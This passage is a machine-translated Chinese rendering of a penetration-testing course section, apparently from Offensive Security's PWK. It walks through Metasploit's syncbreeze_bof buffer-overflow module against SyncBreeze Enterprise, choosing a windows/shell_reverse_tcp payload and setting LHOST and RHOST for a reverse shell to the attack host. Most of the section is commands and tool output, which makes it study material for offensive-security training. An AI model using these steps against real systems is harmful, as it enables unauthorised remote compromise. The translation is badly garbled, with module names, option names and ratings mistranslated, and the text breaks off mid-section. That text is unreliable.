<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84652;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:84652;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步微风企业</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了开始我们对漏洞利用模块的探索，我们将专注于我们滥用时间和</font></font></nobr></div>
<div style="position:absolute;top:84709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次：SyncBreeze。</font><font style="vertical-align: inherit;">在本节中，我们将搜索与 SyncBreeze 相关的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:84728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装在 Windows 10 工作站上的企业应用程序，然后使用 MSF 对其进行利用。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:84748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索同步风</font></font></font></b></nobr></div>
<div style="position:absolute;top:84817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配模块</font></font></nobr></div>
<div style="position:absolute;top:84834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:84868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:84868;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">披露日期 排名 说明</font></font></nobr></div>
<div style="position:absolute;top:84885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:84885;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- ---- ------------</font></font></nobr></div>
<div style="position:absolute;top:84902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/windows/fileformat/syncbreeze_xml 2017-03-29 正常同步微风企业</font></font></nobr></div>
<div style="position:absolute;top:84919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.5.16 - 导入命令缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:84936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/windows/http/syncbreeze_bof    </font></font></nobr></div>
<div style="position:absolute;top:84936;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2017-03-15 伟大的同步微风企业</font></font></nobr></div>
<div style="position:absolute;top:84952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上升 GET 缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:84972;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 756 - 搜索 SyncBreeze 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示了两个特定的漏洞利用模块。</font><font style="vertical-align: inherit;">我们将专注于10.0.28和要求</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的信息</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关</font></font></nobr></div>
<div style="position:absolute;top:85021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该特定模块：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息exploit/windows/http/syncbreeze_bof</font></font></font></b></nobr></div>
<div style="position:absolute;top:85090;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：Sync Breeze Enterprise GET Buffer Overflow</font></font></nobr></div>
<div style="position:absolute;top:85107;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：exploit/windows/http/syncbreeze_bof</font></font></nobr></div>
<div style="position:absolute;top:85123;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">平台：Windows</font></font></nobr></div>
<div style="position:absolute;top:85140;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拱： </font></font></nobr></div>
<div style="position:absolute;top:85157;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权：是</font></font></nobr></div>
<div style="position:absolute;top:85174;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许可证：Metasploit 框架许可证 (BSD)</font></font></nobr></div>
<div style="position:absolute;top:85191;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级：很棒</font></font></nobr></div>
<div style="position:absolute;top:85208;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">披露时间：2017-03-15</font></font></nobr></div>
<div style="position:absolute;top:85242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由...提供：</font></font></nobr></div>
<div style="position:absolute;top:85259;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">丹尼尔·特谢拉</font></font></nobr></div>
<div style="position:absolute;top:85276;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安德鲁·史密斯</font></font></nobr></div>
<div style="position:absolute;top:85293;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欧威斯·梅塔布</font></font></nobr></div>
<div style="position:absolute;top:85310;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">米尔顿瓦伦西亚 (wetw0rk)</font></font></nobr></div>
<div style="position:absolute;top:85344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用目标：</font></font></nobr></div>
<div style="position:absolute;top:85361;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:85378;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
<div style="position:absolute;top:85395;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 自动</font></font></nobr></div>
<div style="position:absolute;top:85412;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 同步微风企业版 v9.4.28</font></font></nobr></div>
<div style="position:absolute;top:85429;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 同步微风企业版 v10.0.28</font></font></nobr></div>
<div style="position:absolute;top:85446;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 同步微风企业版 v10.1.16</font></font></nobr></div>
<div style="position:absolute;top:85480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本选项：</font></font></nobr></div>
<div style="position:absolute;top:85497;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:85514;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:85531;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理    </font></font></nobr></div>
<div style="position:absolute;top:85531;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:85531;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式 type:host:port[,type:hos 的代理链</font></font></nobr></div>
<div style="position:absolute;top:85548;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:85548;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址</font></font></nobr></div>
<div style="position:absolute;top:85564;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告 80    </font></font></nobr></div>
<div style="position:absolute;top:85564;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标端口 (TCP)</font></font></nobr></div>
<div style="position:absolute;top:85582;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL 假    </font></font></nobr></div>
<div style="position:absolute;top:85582;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:85582;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为传出连接协商 SSL/TLS </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:85711;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="73"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 73 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85744;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:86821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:86821;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:86821;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">690</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85840;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机    </font></font></nobr></div>
<div style="position:absolute;top:85840;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:85840;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 服务器虚拟主机</font></font></nobr></div>
<div style="position:absolute;top:85873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷信息：</font></font></nobr></div>
<div style="position:absolute;top:85890;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空间：500</font></font></nobr></div>
<div style="position:absolute;top:85908;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">避免：6 个字符</font></font></nobr></div>
<div style="position:absolute;top:85941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:85958;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块利用了一个基于堆栈的缓冲区溢出漏洞 </font></font></nobr></div>
<div style="position:absolute;top:85975;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sync Breeze Enterprise v9.4.28、v10.0.28 和 </font></font></nobr></div>
<div style="position:absolute;top:85992;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v10.1.16, HTTP 中请求的边界检查不当导致 </font></font></nobr></div>
<div style="position:absolute;top:86009;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET 和 POST 请求发送到内置 Web 服务器。</font><font style="vertical-align: inherit;">这个模块</font></font></nobr></div>
<div style="position:absolute;top:86026;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已在 Windows 7 SP1 x86 上成功测试。</font></font></nobr></div>
<div style="position:absolute;top:86046;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 757 - 同步 Breeze 漏洞利用模块信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据模块描述和可用目标，这实际上似乎是</font></font></nobr></div>
<div style="position:absolute;top:86094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们在 Windows 10 实验室机器上的目标匹配的漏洞利用。</font><font style="vertical-align: inherit;">漏洞利用模块需要有效载荷</font></font></nobr></div>
<div style="position:absolute;top:86114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规格。</font><font style="vertical-align: inherit;">如果我们不设置此项，模块将选择默认有效负载。</font><font style="vertical-align: inherit;">默认有效载荷可能</font></font></nobr></div>
<div style="position:absolute;top:86133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是我们想要或期望的，所以最好明确设置我们的选项以保持紧密</font></font></nobr></div>
<div style="position:absolute;top:86152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制开发过程。</font></font></nobr></div>
<div style="position:absolute;top:86185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要检索与当前选定的漏洞利用模块兼容的所有有效负载的列表，</font></font></nobr></div>
<div style="position:absolute;top:86204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show payloads</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如清单 758 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用exploit/windows/http/syncbreeze_bof</font></font></font></b></nobr></div>
<div style="position:absolute;top:86273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示有效载荷</font></font></font></b></nobr></div>
<div style="position:absolute;top:86307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">兼容的有效载荷</font></font></nobr></div>
<div style="position:absolute;top:86324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">====================</font></font></nobr></div>
<div style="position:absolute;top:86358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:86358;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级说明</font></font></nobr></div>
<div style="position:absolute;top:86375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:86375;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ------------</font></font></nobr></div>
<div style="position:absolute;top:86392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">………………</font></font></nobr></div>
<div style="position:absolute;top:86409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/shell_bind_tcp    </font></font></nobr></div>
<div style="position:absolute;top:86409;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 Windows 命令外壳，绑定 TCP Inli</font></font></nobr></div>
<div style="position:absolute;top:86426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/shell_hidden_​​bind_tcp    </font></font></nobr></div>
<div style="position:absolute;top:86426;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 Windows 命令外壳，隐藏绑定 T</font></font></nobr></div>
<div style="position:absolute;top:86443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/shell_reverse_tcp    </font></font></nobr></div>
<div style="position:absolute;top:86443;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常的 Windows 命令外壳，反向 TCP I</font></font></nobr></div>
<div style="position:absolute;top:86460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/speak_pwned    </font></font></nobr></div>
<div style="position:absolute;top:86460;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通的 Windows 语音 API - 说“你有密码</font></font></nobr></div>
<div style="position:absolute;top:86477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/upexec/bind_hidden_​​ipknock_tcp 正常 Windows 上传/执行，隐藏绑定 </font></font></nobr></div>
<div style="position:absolute;top:86494;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">………………</font></font></nobr></div>
<div style="position:absolute;top:86513;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 758 - 所有适用负载的截断输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以指定一个标准的反向 shell 负载（windows/shell_reverse_tcp）</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:86562;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效负载</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show options</font></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">列出</font></font><b><font style="vertical-align: inherit;">选项</font></b></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/shell_reverse_tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:86614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/shell/reverse_tcp</font></font></nobr></div>
<div style="position:absolute;top:86648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:86682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（exploit/windows/http/syncbreeze_bof）：</font></font></nobr></div>
<div style="position:absolute;top:86716;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:86733;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:86750;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理    </font></font></nobr></div>
<div style="position:absolute;top:86750;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:86750;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式 type:host:port[,type:ho 的代理链</font></font></nobr></div>
<div style="position:absolute;top:86767;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:86767;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:86899;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="74"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 74 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:86932;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:88009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:88009;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:88009;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">691</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87028;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告 80    </font></font></nobr></div>
<div style="position:absolute;top:87028;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标端口 (TCP)</font></font></nobr></div>
<div style="position:absolute;top:87044;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL 假    </font></font></nobr></div>
<div style="position:absolute;top:87044;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:87044;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为传出连接协商 SSL/TLS</font></font></nobr></div>
<div style="position:absolute;top:87061;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机    </font></font></nobr></div>
<div style="position:absolute;top:87061;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:87061;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 服务器虚拟主机</font></font></nobr></div>
<div style="position:absolute;top:87112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">负载选项（windows/shell_reverse_tcp）：</font></font></nobr></div>
<div style="position:absolute;top:87146;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:87163;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:87180;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出线程    </font></font></nobr></div>
<div style="position:absolute;top:87180;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 退出技术（接受：'', seh, thread, pro</font></font></nobr></div>
<div style="position:absolute;top:87197;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:87197;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 监听地址</font></font></nobr></div>
<div style="position:absolute;top:87214;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 4444    </font></font></nobr></div>
<div style="position:absolute;top:87214;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是监听端口</font></font></nobr></div>
<div style="position:absolute;top:87265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用目标：</font></font></nobr></div>
<div style="position:absolute;top:87299;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:87316;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
<div style="position:absolute;top:87333;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 自动</font></font></nobr></div>
<div style="position:absolute;top:87352;left:366"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 759 - 选择有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载设置下方的“利用目标”部分列出了易受攻击的操作系统或软件版本</font></font></nobr></div>
<div style="position:absolute;top:87401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个漏洞。</font><font style="vertical-align: inherit;">在 Syncbreeze 中发现的 vanilla 堆栈溢出的情况下，这些设置</font></font></nobr></div>
<div style="position:absolute;top:87421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本质上等同于适用于不同操作系统版本的不同返回地址或</font></font></nobr></div>
<div style="position:absolute;top:87440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受影响软件的环境。</font><font style="vertical-align: inherit;">在这个漏洞利用模块中，我们的单个静态返回地址</font></font></nobr></div>
<div style="position:absolute;top:87459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncBreeze 版本适用于多个版本的 Windows。</font><font style="vertical-align: inherit;">在其他漏洞利用中，我们经常会</font></font></nobr></div>
<div style="position:absolute;top:87479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要设置目标（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set target</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）以匹配我们正在利用的环境。</font></font></nobr></div>
<div style="position:absolute;top:87511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过为我们的漏洞设置反向 shell 负载，Metasploit 自动添加了一些新的</font></font></nobr></div>
<div style="position:absolute;top:87531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Payload options”，包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（监听主机）和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（监听端口），分别对应</font></font></nobr></div>
<div style="position:absolute;top:87550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向 shell 将连接到的主机 IP 地址和端口。</font><font style="vertical-align: inherit;">请注意，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为默认值</font></font></nobr></div>
<div style="position:absolute;top:87569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4444 的值，这对我们的目的来说很好。</font><font style="vertical-align: inherit;">让我们继续设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来定义</font></font></nobr></div>
<div style="position:absolute;top:87589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别是我们的攻击主机和目标主机。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:87641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:87674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOST 10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:87691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOST =&gt; 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:87711;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 760 - 配置所需的参数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
